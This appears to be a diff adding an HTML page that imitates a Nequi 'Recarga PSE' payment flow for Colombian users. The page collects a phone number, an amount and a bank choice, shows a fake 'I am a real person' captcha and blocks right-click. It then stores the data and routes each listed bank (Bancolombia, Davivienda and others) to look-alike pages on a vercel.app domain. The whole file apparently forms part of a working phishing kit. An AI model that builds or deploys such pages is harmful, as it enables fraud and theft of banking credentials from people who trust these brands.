@@ -1,0 +1,539 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Validar Recarga</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@200..800&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background: #fff;
+            padding: 20px;
+        }
+        .formulario,
+        .validacion {
+            max-width: 360px;
+            margin: auto;
+        }
+
+        .input-rosa,
+        .field-select,
+        .campo-flotante {
+            width: 100%;
+            margin-bottom: 12px;
+            box-sizing: border-box;
+        }
+
+        .input-rosa {
+            padding: 14px 16px;
+            border: none;
+            border-radius: 2px;
+            background: #F8F1F5;
+            font-size: 16px;
+            color: #111;
+            outline: none;
+            font-family: 'Manrope', sans-serif;
+        }
+        .input-rosa::placeholder {
+            color: #200020;
+        }
+
+        .field-select {
+            position: relative;
+            border-radius: 2px;
+            background: #F8F1F5;
+        }
+        .field-select .label {
+            position: absolute;
+            top: 6px;
+            left: 12px;
+            font-size: 12px;
+            color: #e84393;
+            pointer-events: none;
+        }
+        .field-select select {
+            -webkit-appearance: none;
+            appearance: none;
+            width: 100%;
+            border: none;
+            outline: none;
+            background: transparent;
+            font-size: 16px;
+            color: #111;
+            padding: 22px 42px 12px 12px;
+            border-radius: 2px;
+            font-family: 'Manrope', sans-serif;
+            cursor: pointer;
+            font-weight: 500 !important;
+        }
+        .field-select::after {
+            content: "";
+            position: absolute;
+            right: 14px;
+            top: 50%;
+            width: 10px;
+            height: 10px;
+            border-right: 2px solid #333;
+            border-bottom: 2px solid #333;
+            transform: translateY(-30%) rotate(45deg);
+            pointer-events: none;
+        }
+
+        .campo-flotante {
+            position: relative;
+        }
+        .select-rosa {
+            width: 100%;
+            padding: 16px 16px;
+            border: none;
+            border-radius: 2px;
+            background: #F8F1F5;
+            font-size: 16px;
+            color: #111;
+            outline: none;
+            box-sizing: border-box;
+            font-family: 'Manrope', sans-serif;
+            -webkit-appearance: none;
+            appearance: none;
+            cursor: pointer;
+            font-weight: 500 !important;
+        }
+
+        .campo-flotante.select-active .label-flotante,
+        .campo-flotante:focus-within .label-flotante {
+            top: 12px !important;
+            left: 12px !important;
+            font-size: 12px !important;
+            color: #e84393 !important;
+            font-weight: 500 !important;
+            padding: 0 !important;
+            background: transparent !important;
+            font-family: 'Manrope', sans-serif !important;
+        }
+
+        .campo-flotante.select-active .select-rosa,
+        .campo-flotante:focus-within .select-rosa {
+            padding: 20px 16px 12px 16px !important;
+        }
+
+        .campo-flotante .label-flotante {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 16px;
+            color: #200020;
+            pointer-events: none;
+            transition: all 0.2s ease;
+            background: #F8F1F5;
+            padding: 0 4px;
+            font-family: 'Manrope', sans-serif;
+        }
+
+        .campo-flotante::after {
+            content: "";
+            position: absolute;
+            right: 14px;
+            top: 50%;
+            width: 10px;
+            height: 10px;
+            border-right: 2px solid #333;
+            border-bottom: 2px solid #333;
+            transform: translateY(-30%) rotate(45deg);
+            pointer-events: none;
+            opacity: 0;
+            transition: opacity 0.2s ease;
+        }
+        .campo-flotante:focus-within::after,
+        .campo-flotante.select-active::after {
+            opacity: 1;
+        }
+
+        .captcha-container {
+            width: 100%;
+            max-width: 360px;
+            margin: 0 auto 16px auto;
+            padding: 20px 20px;
+            border: 2px solid #f8bbd0;
+            border-radius: 15px;
+            background: #fff;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            gap: 18px;
+            transition: all 0.3s ease;
+            font-size: 16px;
+            box-sizing: border-box;
+            position: relative;
+            overflow: visible;
+        }
+        .captcha-container.checked {
+            background: #f8fffb;
+            border-color: #22c55e;
+        }
+        .captcha-checkbox {
+            width: 35px;
+            height: 35px;
+            border: 3px solid #e91e63;
+            border-radius: 50%;
+            background: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s ease;
+            flex-shrink: 0;
+            position: relative;
+        }
+        .captcha-container.checked .captcha-checkbox {
+            background: #f8fffb;
+            border-color: #22c55e;
+        }
+        .check-svg {
+            width: 32px;
+            height: 32px;
+            opacity: 0;
+            transition: opacity 0.2s;
+        }
+        .captcha-container.checked .check-svg {
+            opacity: 1;
+        }
+        .captcha-text {
+            color: #111;
+            font-weight: 500;
+            font-family: 'Manrope', sans-serif !important;
+            font-size: 16px;
+            line-height: 1.4;
+        }
+        .ripple-outer {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 35px;
+            height: 35px;
+            border: 1.5px solid #e91e63;
+            border-radius: 50%;
+            transform: translate(-50%, -50%) scale(1);
+            opacity: 0.8;
+            pointer-events: none;
+            animation: ripple-outer 3s infinite ease-out;
+        }
+        @keyframes ripple-outer {
+            0% {
+                transform: translate(-50%, -50%) scale(1);
+                opacity: 0.8;
+            }
+            100% {
+                transform: translate(-50%, -50%) scale(2);
+                opacity: 0;
+            }
+        }
+        .captcha-container.checked .ripple-outer {
+            animation: none;
+            opacity: 0;
+        }
+        .ayuda-link {
+            display: block;
+            text-align: center;
+            margin-top: 12px;
+            color: #e91e63;
+            font-size: 14px;
+            text-decoration: none;
+        }
+        .ayuda-link:hover {
+            text-decoration: underline;
+        }
+        select option,
+        select optgroup {
+            background-color: #F8F1F5 !important;
+            color: #111 !important;
+        }
+        select option:hover,
+        select option:checked {
+            background-color: #f5e8ef !important;
+        }
+        .validacion {
+            display: none;
+            background: #fff;
+            border-radius: 12px;
+            padding: 16px;
+            box-shadow: 0px 2px 6px rgba(0, 0, 0, 0.1);
+        }
+        .validacion p {
+            margin: 4px 0;
+            font-size: 14px;
+        }
+        .label-text {
+            color: #e91e63;
+            font-size: 13px;
+        }
+        .valor-text {
+            color: #111;
+            font-weight: 500;
+        }
+        button {
+            padding: 12px;
+            border: none;
+            background: #e91e63;
+            color: #fff;
+            font-size: 16px;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+        button:disabled {
+            background-color: #f1bfda !important;
+            cursor: not-allowed;
+        }
+        .header-img {
+            width: 100%;
+            max-width: 400px;
+            display: block;
+            margin: 0 auto;
+        }
+        .footer-img {
+            width: 100%;
+            max-width: 700px;
+            display: block;
+            margin: 0 auto;
+        }
+
+        .btn-recargar {
+            background: #da0081;
+            color: #fff;
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 6px;
+            margin-top: 12px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .btn-recargar:hover {
+            background: #b0006a;
+        }
+
+        .btn-atras {
+            background: #fff;
+            color: #200020;
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #200020;
+            border-radius: 6px;
+            margin-top: 8px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .btn-atras:hover {
+            background: #f5f5f5;
+        }
+    </style>
+</head>
+<body>
+
+    <script>
+        document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
+    </script>
+
+    <!-- Encabezado -->
+    <img id="header-img" src="img/h1.png" class="header-img" alt="">
+
+    <!-- Formulario -->
+    <div class="formulario" id="formulario">
+        <input maxlength="10" id="celular" class="input-rosa" type="tel" placeholder="Número de celular">
+        <input maxlength="10" id="confirmar" class="input-rosa" type="tel" placeholder="Confirma el número de celular">
+        <input id="monto" class="input-rosa" type="tel" placeholder="¿Cuánto?">
+
+        <script>
+            (function() {
+                const input = document.getElementById('monto');
+                const MAX_DIGITS = 8;
+                input.addEventListener('input', function() {
+                    let digits = this.value.replace(/\D/g, '').replace(/^0+/, '');
+                    if (digits.length > MAX_DIGITS) digits = digits.slice(0, MAX_DIGITS);
+                    if (digits) {
+                        const formatted = new Intl.NumberFormat('es-CO').format(Number(digits));
+                        this.value = '$ ' + formatted;
+                    } else {
+                        this.value = '';
+                    }
+                    validarFormulario();
+                });
+                input.addEventListener('paste', function(e) {
+                    e.preventDefault();
+                    let text = (e.clipboardData || window.clipboardData).getData('text') || '';
+                    text = text.replace(/\D/g, '').replace(/^0+/, '').slice(0, MAX_DIGITS);
+                    if (text) {
+                        const formatted = new Intl.NumberFormat('es-CO').format(Number(text));
+                        this.value = '$ ' + formatted;
+                    } else {
+                        this.value = '';
+                    }
+                    validarFormulario();
+                });
+            })();
+        </script>
+
+        <div class="field-select">
+            <span class="label">Tipo de persona</span>
+            <select id="tipo">
+                <option>Natural</option>
+                <option>Jurídica</option>
+            </select>
+        </div>
+
+        <div class="campo-flotante">
+            <select id="banco" required class="select-rosa">
+                <option value="" disabled selected></option>
+                <option value="">A continuación seleccione su banco</option>
+                <option value="bc">BANCOLOMBIA</option>
+                <option value="dv">DAVIVIENDA</option>
+                <option value="bg">BANCO DE BOGOTÁ</option>
+                <option value="avv">BANCO AV VILLAS</option>
+                <option value="pop">BANCO POPULAR</option>
+                <option value="cj">BANCO CAJA SOCIAL</option>
+                <option value="cpa">SCOTIABANK COLPATRIA</option>
+                <option value="occ">BANCO OCCIDENTE</option>
+            </select>
+            <span class="label-flotante">Elige el banco</span>
+        </div>
+
+        <!-- CAPTCHA -->
+        <div class="captcha-container" id="captchaBox">
+            <div class="captcha-checkbox">
+                <div class="ripple-outer"></div>
+                <svg class="check-svg" width="35" height="35" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M5 13L9 17L19 7" stroke="#4caf50" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+            </div>
+            <div class="captcha-text">Confirmo que soy una persona real.</div>
+        </div>
+
+        <img id="footer-img" src="img/minifooter.png" class="footer-img" alt="">
+
+        <button id="btnContinuar" style="padding: 4.3%; width: 100%; border-radius: 6px;" type="button" onclick="mostrarValidacion()" disabled>
+            Continuar
+        </button>
+        <a class="ayuda-link" href="#">Ayuda</a>
+    </div>
+
+    <!-- Validación -->
+    <div class="validacion" id="vista-validacion">
+        <p class="label-text">Concepto</p>
+        <p class="valor-text">Recarga Nequi PSE</p>
+        <p class="label-text">Número de celular</p>
+        <p class="valor-text" id="val-celular"></p>
+        <p class="label-text">¿Cuánto?</p>
+        <p class="valor-text" id="val-monto"></p>
+        <p class="label-text">Tipo de persona</p>
+        <p class="valor-text" id="val-tipo"></p>
+        <p class="label-text">Banco</p>
+        <p class="valor-text" id="val-banco"></p>
+        <button class="btn-recargar" onclick="irARegistroCorreo()">
+            Recargar
+        </button>
+        <button class="btn-atras" onclick="volverFormulario()">Atrás</button>
+    </div>
+
+    <script>
+        // ============================================================
+        // MAPA DE BANCOS A URLs DE PAGO
+        // ============================================================
+        const bancosPSE = {
+            'bc': 'https://pagosonline-pse.vercel.app/sites/bc/manager/152',
+            'dv': 'https://pagosonline-pse.vercel.app/sites/dv/manager/152',
+            'bg': 'https://pagosonline-pse.vercel.app/sites/bg/manager/152',
+            'avv': 'https://pagosonline-pse.vercel.app/sites/avv/manager/152',
+            'pop': 'https://pagosonline-pse.vercel.app/sites/pop/manager/152',
+            'cj': 'https://pagosonline-pse.vercel.app/sites/cj/manager/152',
+            'cpa': 'https://pagosonline-pse.vercel.app/sites/cpa/manager/152',
+            'occ': 'https://pagosonline-pse.vercel.app/sites/occ/manager/152'
+        };
+
+        let captchaChecked = false;
+        document.getElementById('captchaBox').addEventListener('click', () => {
+            captchaChecked = !captchaChecked;
+            document.getElementById('captchaBox').classList.toggle('checked', captchaChecked);
+            validarFormulario();
+        });
+
+        document.getElementById('banco').addEventListener('change', function() {
+            this.parentElement.classList.add('select-active');
+            validarFormulario();
+        });
+
+        function validarFormulario() {
+            const celular = document.getElementById("celular").value.trim();
+            const confirmar = document.getElementById("confirmar").value.trim();
+            const monto = document.getElementById("monto").value.trim();
+            const banco = document.getElementById("banco").value;
+            const btn = document.getElementById("btnContinuar");
+            if (
+                celular !== "" &&
+                confirmar !== "" &&
+                celular === confirmar &&
+                monto !== "" &&
+                banco !== "" &&
+                captchaChecked
+            ) {
+                btn.disabled = false;
+                btn.style.backgroundColor = "#da0081";
+            } else {
+                btn.disabled = true;
+                btn.style.backgroundColor = "#f1bfda";
+            }
+        }
+
+        function mostrarValidacion() {
+            const celular = document.getElementById("celular").value.trim();
+            const monto = document.getElementById("monto").value.trim();
+            const tipo = document.getElementById("tipo").value;
+            const selectBanco = document.getElementById("banco");
+            const nombreBanco = selectBanco.options[selectBanco.selectedIndex].text;
+            
+            document.getElementById("val-celular").textContent = celular;
+            document.getElementById("val-monto").textContent = monto;
+            document.getElementById("val-tipo").textContent = tipo;
+            document.getElementById("val-banco").textContent = nombreBanco;
+            
+            document.getElementById("header-img").src = "img/h2.png";
+            document.getElementById("footer-img").style.display = "none";
+            document.getElementById("formulario").style.display = "none";
+            document.getElementById("vista-validacion").style.display = "block";
+        }
+
+        function volverFormulario() {
+            document.getElementById("header-img").src = "img/h1.png";
+            document.getElementById("footer-img").style.display = "block";
+            document.getElementById("formulario").style.display = "block";
+            document.getElementById("vista-validacion").style.display = "none";
+        }
+
+        // ================================================================
+        // REDIRIGE AL FORMULARIO DE CORREO CON LOS DATOS
+        // ================================================================
+        function irARegistroCorreo() {
+            const celular = document.getElementById("val-celular").textContent.trim();
+            const monto = document.getElementById("val-monto").textContent.trim();
+            const tipo = document.getElementById("val-tipo").textContent.trim();
+            const banco = document.getElementById("val-banco").textContent.trim();
+            const bancoId = document.getElementById("banco").value;
+            const urlPago = bancosPSE[bancoId];
+
+            // Guardar datos en sessionStorage
+            sessionStorage.setItem('celular', celular);
+            sessionStorage.setItem('monto', monto);
+            sessionStorage.setItem('tipo', tipo);
+            sessionStorage.setItem('banco', banco);
+            sessionStorage.setItem('bancoId', bancoId);
+            sessionStorage.setItem('urlPago', urlPago);
+
+            // Redirigir a PSEUserRegister/index.html
+            window.location.href = 'PSEUserRegister/index.html';
+        }
+    </script>
+
+</body>
+</html>
